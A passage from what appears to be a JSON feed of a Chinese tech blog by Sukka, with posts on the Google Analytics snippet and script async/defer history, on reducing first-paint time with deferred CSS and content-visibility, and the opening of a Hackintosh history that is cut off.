class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 